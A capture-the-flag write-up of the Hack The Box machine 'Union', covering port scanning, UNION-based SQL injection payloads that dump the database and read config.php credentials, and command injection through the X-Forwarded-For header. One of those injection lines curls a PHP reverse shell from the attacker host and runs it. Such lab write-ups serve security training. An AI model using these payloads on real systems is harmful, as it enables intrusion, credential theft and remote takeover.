---
date: 2025-09-14
categories: [Linux, Medium]
---

![Union](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/70ed2fa8b9c21114d688ba3f176c0198.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [ippsec](https://app.hackthebox.com/users/3769) & [Llo0zy](https://app.hackthebox.com/users/1615089)        | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Linux   |

---








 Enumeration

- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports:

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.128 -oG scan
	/opt/extractports scan
	nmap -p80 -sCV 10.10.11.128 -oN ports
	```

	<img width="778" height="218" alt="image" src="https://github.com/user-attachments/assets/2b23f301-43bb-4998-a32d-a171adb59f64" />

- From the scan results, only port 80 (HTTP) was open.
## Initial Access (Web Enumeration)

- Using `ffuf`, I enumerated `.php` files in the root directory:

	```python
	ffuf -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.128/FUZZ.php --mc=200
	```

- The following files were discovered:

	`index.php`
	`firewall.php`
	`config.php`
	`challenge.php`

- Both `index.php` and `challenge.php` contained input fields that were sent to the server. Testing with SQL payloads revealed differences in responses, suggesting SQL injection was possible.

## Exploiting SQL Injection

- Injecting a single quote (`'`) and appending a comment sequence triggered diferent message, confirming SQL injection. Using a `UNION` injection, I successfully extracted database information:

	```python
	1' UNION SELECT database()-- -  
	-- november  
	
	1' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -  
	-- mysql, information_schema, performance_schema, sys, november  
	
	1' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='november'-- -  
	-- flag, players  
	
	1' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='november' AND table_name='flag'-- -  
	
	1' UNION SELECT group_concat(one) FROM flag-- -  
	-- UHC{F1rst_5tep_2_Qualify}
	```

- Submitting the flag to `firewall.php` returned a success message, indicating that port **22 (SSH)** had been opened.

- Additionally, by leveraging `load_file()`, I retrieved the contents of `config.php` and extracted valid SSH credentials:

	```python
	player=a' union select load_file('/var/www/html/config.php');-- -
	```

- I then connected via SSH as user `uhc` and retrieved the first flag:

  ```python
  ssh uhc@10.10.11.128
  ```

## Privilege Escalation 

- Reviewing the source of `firewall.php`, I identified functionality that appended my IP address to an `iptables` command. Since the input was unsanitized, this was vulnerable to command injection through the `X-Forwarded-For` HTTP header.

- For example:

	```python
	X-FORWARDED-FOR: 1.1.1.1; whoami;
	```

- To gain a shell, I hosted a PHP reverse shell on my attacker machine and executed it remotely:

	```python
	X-FORWARDED-FOR: 1.1.1.1; curl http://10.10.14.16/rever.php | php;
	```

- This granted me a shell as the `www-data` user.

- Checking for sudo privileges revealed full root access without a password prompt:

	```python
	sudo -l
	```
	
- Since `www-data` could run any command as root, I obtained the root flag:

	```python
	sudo cat /root/root.txt
	```
